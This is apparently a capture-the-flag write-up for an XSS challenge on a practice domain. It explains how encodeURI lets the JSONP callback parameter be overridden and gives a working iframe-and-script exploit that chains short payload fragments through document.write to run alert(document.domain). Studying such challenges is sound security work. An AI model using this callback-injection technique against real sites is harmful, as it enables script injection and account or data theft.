### Link

https://vulnerabledoma.in/xss_2020-06/

### Write_up

Key Codes

```javascript
var callback = function(msg) {
      result.innerHTML = msg;
    }
    document.addEventListener('DOMContentLoaded', function(event) {
      if (getQuery('code')) {
        var code = getQuery('code');
        c.value = code;
        checkCode(code);
      }
    });
    form.addEventListener('submit', function(event) {
      checkCode(c.value);
      event.preventDefault();
    });

    function checkCode(code) {
      var s = document.createElement('script');
      s.src = `/xss_2020-06/check_code.php?callback=callback&code=${encodeURI(code)}`;
      document.body.appendChild(s);
    }

    function getQuery(name) {
      return new URL(location.href).searchParams.get(name);
    }
```

Since the encodeURI Function , we can overide the callback parameter

Example

```
callback=callback&code=1%26callback=alert
```

Now the callback is the alert Function.However，there is a limit to the number of characters of the code parameters in the check.php file.

```php
if (isset($_GET['code']))
{
    $key = $_GET['code'];
}

if (mb_strlen($key, "UTF-8") <= 10)
{
    if ($key == "XSS_ME")
    {
        $result = "Okay! You can access <a href='#not-implemented'>the secret page</a>!";
    }
    else
    {
        $result = "Invalid code: '$key'";
    }
}
```

So, the exploit  as follows:

```javascript
<iframe src="https://vulnerabledoma.in/xss_2020-06/" onload="start()"></iframe>
<iframe src="https://vulnerabledoma.in/xss_2020-06/" name="y" id="test"></iframe>
<iframe src="https://vulnerabledoma.in/xss_2020-06/" name="alert(document.domain)"></iframe>
<iframe src="https://vulnerabledoma.in/xss_2020-06/" name="exploit"></iframe>
 
<script>
    function loadframe(payload,func){
        return new Promise(resolve => {
            test.src = `https://vulnerabledoma.in/xss_2020-06/?code=${payload}%26callback=${func}`;
            test.onload = function(){
                return resolve(true);
            }
        });
    }

    async function start(){
      await loadframe("<script>/*","top.exploit.document.write");
      await loadframe("*/eval(/*","top.exploit.document.write");
      await loadframe("*/top[2]/*","top.exploit.document.write");
      await loadframe("*/.name)//","top.exploit.document.write");
      await loadframe("<\/script>","top.exploit.document.write");
    }
</script>
```

